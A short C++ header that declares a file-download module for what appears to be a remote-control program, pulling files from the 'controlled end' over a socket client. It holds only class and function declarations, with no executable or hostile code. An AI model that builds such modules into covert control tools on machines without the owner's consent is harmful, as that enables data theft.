#pragma once

#include "ModuleManage.h"



#define FILE_DOWNLOAD_INFO_PACKET_BODY_LENGTH (16 + MAX_PATH * 2)



class CFileDownload : public  CModule {
public:
	//CRITICAL_SECTION			m_WriteLock;

	WCHAR						m_pszFilePath[MAX_PATH];			// 要下载的文件的路径（被控端文件的路径）

	WCHAR						m_pszDownloadPath[MAX_PATH];		// 要下载到什么目录下

	HANDLE						m_hRecvPacketFileDownloadInfoEvent;
	HANDLE						m_hRecvPacketFileDownloadCloseEvent;

public:
	CFileDownload(CSocketClient* pSocketClient);
	~CFileDownload();

	// 重写虚函数
	void OnRecvChildSocketClientPacket(CPacket* pPacket);

	//BOOL CFileUpload::UploadFileFunc();

};


BOOL DownloadFile(CClient* pClient, LPWSTR pszFilePath, LPWSTR pszUploadPath);